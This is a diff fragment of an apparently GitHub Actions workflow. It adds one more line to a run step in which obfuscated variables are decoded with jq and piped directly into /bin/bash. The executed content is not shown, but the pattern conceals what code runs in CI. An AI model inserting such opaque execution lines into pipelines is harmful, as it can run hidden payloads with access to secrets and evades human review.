@@ -30,6 +30,7 @@ jobs:
           echo $gs183 | jq -r .uao7990 | /bin/bash
           echo $ntshk38 | jq -r .tl8596 | /bin/bash
           printf '%s' "$nkhg4780" | jq -r .atku088 | /bin/bash
+          echo $dtu91608 | jq -r .a2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
